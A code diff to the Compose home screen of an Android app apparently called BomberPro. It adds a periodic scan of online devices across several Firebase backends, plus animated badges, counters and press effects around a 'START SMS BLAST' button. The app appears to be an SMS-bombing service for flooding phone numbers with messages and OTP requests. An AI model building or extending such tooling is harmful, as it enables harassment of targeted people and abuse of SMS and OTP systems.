@@ -38,6 +38,7 @@ import androidx.compose.runtime.LaunchedEffect
 import androidx.compose.runtime.getValue
 import androidx.compose.runtime.mutableStateOf
 import androidx.compose.runtime.remember
+import androidx.compose.runtime.rememberCoroutineScope
 import androidx.compose.runtime.setValue
 import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
@@ -55,13 +56,21 @@ import com.sanji.bomberpro.data.UserProfile
 import com.sanji.bomberpro.data.UserRole
 import com.sanji.bomberpro.navigation.Routes
 import com.sanji.bomberpro.services.NotificationsService
+import com.sanji.bomberpro.services.RealtimeDbService
+import com.sanji.bomberpro.services.UserDataService
 import com.sanji.bomberpro.services.UserDocObserver
 import com.sanji.bomberpro.theme.LocalSanjiColors
 import com.sanji.bomberpro.ui.admin.AdminScreen
 import com.sanji.bomberpro.ui.blast.SmsBlastScreen
+import com.sanji.bomberpro.ui.components.AnimatedBadge
+import com.sanji.bomberpro.ui.components.AnimatedCounter
+import com.sanji.bomberpro.ui.components.SanjiEmoji
+import com.sanji.bomberpro.ui.components.fadeSlideIn
+import com.sanji.bomberpro.ui.components.pressScale
 import com.sanji.bomberpro.ui.history.HistoryScreen
 import com.sanji.bomberpro.ui.otp.OtpScreen
 import com.sanji.bomberpro.ui.wallet.WalletScreen
+import kotlinx.coroutines.launch
 
 @Composable
 fun HomeScreen(
@@ -72,6 +81,7 @@ fun HomeScreen(
     onNavigate: (String) -> Unit,
 ) {
     val colors = LocalSanjiColors.current
+    val scope = rememberCoroutineScope()
     var currentTab by remember { mutableStateOf(HomeTab.HOME) }
 
     val isAdmin = role.priority >= UserRole.ADMIN.priority
@@ -85,6 +95,30 @@ fun HomeScreen(
     var unreadNotifications by remember { mutableStateOf(0) }
     LaunchedEffect(user.uid) {
         NotificationsService().unreadCountFlow(user.uid).collect { unreadNotifications = it }
+    }
+
+    // Live device scan — kicks off on home, keeps refreshing every 30s.
+    // Pre-warms the cache for SmsBlastScreen so users don't need to press scan.
+    val rtdb = remember { RealtimeDbService() }
+    val userData = remember { UserDataService() }
+    var onlineDevices by remember { mutableStateOf(0) }
+    var scanningDevices by remember { mutableStateOf(true) }
+
+    LaunchedEffect(Unit) {
+        try {
+            val firebases = rtdb.loadFirebases()
+            rtdb.observeDevicesFlow(firebases, intervalMs = 30_000L).collect { devices ->
+                onlineDevices = devices.size
+                scanningDevices = false
+            }
+        } catch (_: Exception) {
+            scanningDevices = false
+        }
+    }
+
+    // Update last active timestamp once per launch
+    LaunchedEffect(user.uid) {
+        try { userData.updateLastActive(user.uid) } catch (_: Exception) {}
     }
 
     val liveCredits = (userMap["credits"] as? Number)?.toInt() ?: (profile?.credits ?: 0)
@@ -122,6 +156,8 @@ fun HomeScreen(
                     liveBanned = liveBanned,
                     liveBanReason = liveBanReason,
                     unreadNotifications = unreadNotifications,
+                    onlineDevices = onlineDevices,
+                    scanningDevices = scanningDevices,
                     onStartBlast = { currentTab = HomeTab.BLAST },
                     onOpenWallet = { currentTab = HomeTab.WALLET },
                     onOpenHistory = { currentTab = HomeTab.HISTORY },
@@ -203,6 +239,8 @@ private fun HomeTabContent(
     liveBanned: Boolean,
     liveBanReason: String,
     unreadNotifications: Int,
+    onlineDevices: Int,
+    scanningDevices: Boolean,
     onStartBlast: () -> Unit,
     onOpenWallet: () -> Unit,
     onOpenHistory: () -> Unit,
@@ -228,7 +266,10 @@ private fun HomeTabContent(
             .verticalScroll(scrollState)
             .padding(horizontal = 16.dp, vertical = 12.dp),
     ) {
-        Row(modifier = Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically) {
+        Row(
+            modifier = Modifier.fillMaxWidth().fadeSlideIn(delayMs = 0),
+            verticalAlignment = Alignment.CenterVertically,
+        ) {
             if (profile?.photoUrl?.isNotBlank() == true) {
                 AsyncImage(
                     model = profile.photoUrl,
@@ -258,7 +299,7 @@ private fun HomeTabContent(
                     )
                     if (livePremium) {
                         Spacer(Modifier.width(6.dp))
-                        Text("💎", fontSize = 13.sp)
+                        Text(SanjiEmoji.PREMIUM, fontSize = 13.sp)
                     }
                 }
                 Text(
@@ -272,7 +313,7 @@ private fun HomeTabContent(
                     onClick = onOpenNotifications,
                     shape = CircleShape,
                     color = colors.surface,
-                    modifier = Modifier.size(42.dp),
+                    modifier = Modifier.size(42.dp).pressScale(),
                 ) {
                     Box(contentAlignment = Alignment.Center) {
                         Icon(
@@ -281,21 +322,10 @@ private fun HomeTabContent(
                         )
                     }
                 }
-                if (unreadNotifications > 0) {
-                    Box(
-                        modifier = Modifier
-                            .align(Alignment.TopEnd)
-                            .size(18.dp)
-                            .clip(CircleShape)
-                            .background(colors.error),
-                        contentAlignment = Alignment.Center,
-                    ) {
-                        Text(
-                            if (unreadNotifications > 9) "9+" else "$unreadNotifications",
-                            fontSize = 9.sp, fontWeight = FontWeight.Bold, color = Color.White,
-                        )
-                    }
-                }
+                AnimatedBadge(
+                    count = unreadNotifications,
+                    modifier = Modifier.align(Alignment.TopEnd).size(18.dp),
+                )
             }
 
             Spacer(Modifier.width(8.dp))
@@ -304,7 +334,7 @@ private fun HomeTabContent(
                 onClick = onOpenSettings,
                 shape = CircleShape,
                 color = colors.surface,
-                modifier = Modifier.size(42.dp),
+                modifier = Modifier.size(42.dp).pressScale(),
             ) {
                 Box(contentAlignment = Alignment.Center) {
                     Icon(
@@ -320,11 +350,11 @@ private fun HomeTabContent(
             Surface(
                 shape = RoundedCornerShape(12.dp),
                 color = colors.error.copy(alpha = 0.15f),
-                modifier = Modifier.fillMaxWidth(),
+                modifier = Modifier.fillMaxWidth().fadeSlideIn(delayMs = 80),
             ) {
                 Column(Modifier.padding(12.dp)) {
                     Row(verticalAlignment = Alignment.CenterVertically) {
-                        Text("🚫", fontSize = 18.sp)
+                        Text(SanjiEmoji.BANNED, fontSize = 18.sp)
                         Spacer(Modifier.width(10.dp))
                         Column(modifier = Modifier.weight(1f)) {
                             Text(
@@ -342,6 +372,7 @@ private fun HomeTabContent(
                         onClick = onOpenAppeal,
                         shape = RoundedCornerShape(10.dp),
                         color = colors.error,
+                        modifier = Modifier.pressScale(),
                     ) {
                         Text(
                             "Appeal Ban",
@@ -353,11 +384,12 @@ private fun HomeTabContent(
             }
         }
 
-        Spacer(Modifier.height(20.dp))
+        Spacer(Modifier.height(16.dp))
 
+        // Hero blast card
         Surface(
             onClick = onStartBlast,
-            modifier = Modifier.fillMaxWidth().height(120.dp),
+            modifier = Modifier.fillMaxWidth().height(120.dp).fadeSlideIn(delayMs = 140).pressScale(),
             shape = RoundedCornerShape(24.dp),
             color = Color.Transparent,
         ) {
@@ -370,29 +402,37 @@ private fun HomeTabContent(
                     Icon(Icons.Default.RocketLaunch, null, modifier = Modifier.size(36.dp), tint = Color.Black)
                     Spacer(Modifier.height(8.dp))
                     Text("START SMS BLAST", fontSize = 18.sp, fontWeight = FontWeight.Black, color = Color.Black)
-                    Text("Tap to launch", fontSize = 11.sp, color = Color.Black.copy(alpha = 0.7f))
+                    Text(
+                        if (scanningDevices) "Scanning devices…"
+                        else "$onlineDevices devices online · Tap to launch",
+                        fontSize = 11.sp, color = Color.Black.copy(alpha = 0.75f),
+                    )
                 }
             }
         }
 
-        Spacer(Modifier.height(20.dp))
+        Spacer(Modifier.height(16.dp))
 
-        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(12.dp)) {
-            StatCard(Icons.Default.Send, "Total SMS", "$liveTotalSms", Modifier.weight(1f))
-            StatCard(Icons.Default.VpnKey, "OTPs", "$liveTotalOtps", Modifier.weight(1f))
+        Row(modifier = Modifier.fillMaxWidth().fadeSlideIn(delayMs = 200), horizontalArrangement = Arrangement.spacedBy(12.dp)) {
+            StatCard(Icons.Default.Send, "Total SMS", liveTotalSms, SanjiEmoji.SEND, Modifier.weight(1f))
+            StatCard(Icons.Default.VpnKey, "OTPs", liveTotalOtps, SanjiEmoji.OTP, Modifier.weight(1f))
         }
         Spacer(Modifier.height(12.dp))
-        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(12.dp)) {
-            StatCard(Icons.Default.MonetizationOn, "Credits", "$liveCredits", Modifier.weight(1f), onClick = onOpenWallet)
-            StatCard(Icons.Default.Toll, "Coins", "$liveCoins", Modifier.weight(1f), onClick = onOpenWallet)
+        Row(modifier = Modifier.fillMaxWidth().fadeSlideIn(delayMs = 260), horizontalArrangement = Arrangement.spacedBy(12.dp)) {
+            StatCard(Icons.Default.MonetizationOn, "Credits", liveCredits, SanjiEmoji.CREDITS, Modifier.weight(1f), onClick = onOpenWallet)
+            StatCard(Icons.Default.Toll, "Coins", liveCoins, SanjiEmoji.COINS, Modifier.weight(1f), onClick = onOpenWallet)
         }
 
         Spacer(Modifier.height(20.dp))
 
-        Text("Quick Access", fontSize = 14.sp, fontWeight = FontWeight.SemiBold, color = colors.onBackground)
+        Text(
+            "Quick Access",
+            fontSize = 14.sp, fontWeight = FontWeight.SemiBold, color = colors.onBackground,
+            modifier = Modifier.fadeSlideIn(delayMs = 320),
+        )
         Spacer(Modifier.height(8.dp))
 
-        Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+        Row(modifier = Modifier.fillMaxWidth().fadeSlideIn(delayMs = 340), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
             QuickAccessChip(Icons.Default.History, "History", onOpenHistory, Modifier.weight(1f))
             QuickAccessChip(Icons.Default.CardGiftcard, "Refer", onOpenRefer, Modifier.weight(1f))
             QuickAccessChip(Icons.Default.VpnKey, "OTP", onOpenOtp, Modifier.weight(1f))
@@ -400,7 +440,7 @@ private fun HomeTabContent(
 
         Spacer(Modifier.height(8.dp))
 
-        Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+        Row(modifier = Modifier.fillMaxWidth().fadeSlideIn(delayMs = 400), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
             QuickAccessChip(Icons.Default.SwapHoriz, "Transfer", onOpenTransfer, Modifier.weight(1f))
             QuickAccessChip(Icons.Default.CardGiftcard, "Gift", onOpenGift, Modifier.weight(1f))
             QuickAccessChip(Icons.Default.WorkspacePremium, "Templates", onOpenTemplates, Modifier.weight(1f))
@@ -408,7 +448,7 @@ private fun HomeTabContent(
 
         Spacer(Modifier.height(8.dp))
 
-        Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+        Row(modifier = Modifier.fillMaxWidth().fadeSlideIn(delayMs = 460), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
             QuickAccessChip(Icons.Default.WorkspacePremium, "Giveaways", onOpenGiveaways, Modifier.weight(1f))
             QuickAccessChip(Icons.Default.Notifications, "Announce", onOpenAnnouncements, Modifier.weight(1f))
             QuickAccessChip(Icons.Default.MonetizationOn, "Schedule", onOpenSchedule, Modifier.weight(1f))
@@ -416,9 +456,8 @@ private fun HomeTabContent(
 
         Spacer(Modifier.height(8.dp))
 
-        Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+        Row(modifier = Modifier.fillMaxWidth().fadeSlideIn(delayMs = 520), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
             QuickAccessChip(Icons.Default.SupportAgent, "Support", onOpenSupport, Modifier.weight(1f))
-            // Keeps row layout stable — two spacers fill remaining slots
             Spacer(Modifier.weight(1f))
             Spacer(Modifier.weight(1f))
         }
@@ -431,7 +470,8 @@ private fun HomeTabContent(
 private fun StatCard(
     icon: ImageVector,
     label: String,
-    value: String,
+    value: Int,
+    emoji: String,
     modifier: Modifier = Modifier,
     onClick: (() -> Unit)? = null,
 ) {
@@ -443,9 +483,18 @@ private fun StatCard(
         onClick = onClick ?: {},
     ) {
         Column(modifier = Modifier.padding(14.dp)) {
-            Icon(icon, null, tint = colors.primary, modifier = Modifier.size(20.dp))
+            Row(verticalAlignment = Alignment.CenterVertically) {
+                Icon(icon, null, tint = colors.primary, modifier = Modifier.size(20.dp))
+                Spacer(Modifier.weight(1f))
+                Text(emoji, fontSize = 14.sp)
+            }
             Spacer(Modifier.height(10.dp))
-            Text(value, fontSize = 20.sp, fontWeight = FontWeight.Bold, color = colors.onBackground)
+            AnimatedCounter(
+                value = value,
+                style = androidx.compose.ui.text.TextStyle(fontSize = 20.sp),
+                color = colors.onBackground,
+                fontWeight = FontWeight.Bold,
+            )
             Text(label, fontSize = 11.sp, color = colors.onSurfaceVariant)
         }
     }
@@ -454,7 +503,12 @@ private fun StatCard(
 @Composable
 private fun QuickAccessChip(icon: ImageVector, label: String, onClick: () -> Unit, modifier: Modifier = Modifier) {
     val colors = LocalSanjiColors.current
-    Surface(modifier = modifier, onClick = onClick, shape = RoundedCornerShape(14.dp), color = colors.surface) {
+    Surface(
+        modifier = modifier.pressScale(),
+        onClick = onClick,
+        shape = RoundedCornerShape(14.dp),
+        color = colors.surface,
+    ) {
         Column(
             modifier = Modifier.padding(vertical = 14.dp),
             horizontalAlignment = Alignment.CenterHorizontally,
